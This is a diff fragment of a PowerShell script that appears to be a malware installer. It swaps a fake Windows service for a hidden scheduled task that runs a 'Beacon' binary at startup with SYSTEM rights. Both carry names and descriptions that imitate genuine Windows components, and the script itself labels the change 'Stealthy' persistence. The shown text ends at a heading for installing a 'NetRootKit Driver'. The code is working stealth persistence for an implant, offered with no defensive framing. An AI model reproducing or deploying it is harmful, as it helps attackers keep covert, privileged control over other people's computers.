@@ -130,18 +130,23 @@ if (-not (Test-Path $BeaconPath)) {
     }
 }
 
-$serviceCheck = Get-Service -Name "USORuntimeBroker" -ErrorAction SilentlyContinue
-if (-not $serviceCheck) {
-    Write-Host "    -> Creating Stealthy Service Persistence..."
-    sc.exe create USORuntimeBroker binPath= `"$BeaconPath`" start= auto obj= LocalSystem | Out-Null
-    sc.exe description USORuntimeBroker "Manages User Session Orchestrator runtime tasks." | Out-Null
+Write-Host "    -> Starting the Beacon silently..."
+$processCheck = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Where-Object {$_.Path -eq $BeaconPath}
+if (-not $processCheck) {
+    Start-Process -FilePath $BeaconPath -WindowStyle Hidden -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 3
 }
 
-$svc = Get-Service -Name "USORuntimeBroker" -ErrorAction SilentlyContinue
-if ($svc -and $svc.Status -ne 'Running') {
-    Write-Host "    -> Starting the Beacon Service..."
-    sc.exe start USORuntimeBroker | Out-Null
-    Start-Sleep -Seconds 3
+Write-Host "    -> Creating Stealthy Scheduled Task Persistence for Beacon..."
+$BeaconTaskName = "USOSharedRuntimeUpdate"
+$taskCheck = Get-ScheduledTask -TaskName $BeaconTaskName -ErrorAction SilentlyContinue
+if (-not $taskCheck) {
+    $BeaconAction = New-ScheduledTaskAction -Execute $BeaconPath
+    $BeaconTrigger = New-ScheduledTaskTrigger -AtStartup
+    $BeaconPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    $BeaconSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
+
+    Register-ScheduledTask -TaskName $BeaconTaskName -Action $BeaconAction -Trigger $BeaconTrigger -Principal $BeaconPrincipal -Settings $BeaconSettings -Description "Orchestrates user session shared runtime updates." -Force | Out-Null
 }
 
 # --- 7. Install & Start NetRootKit Driver ---
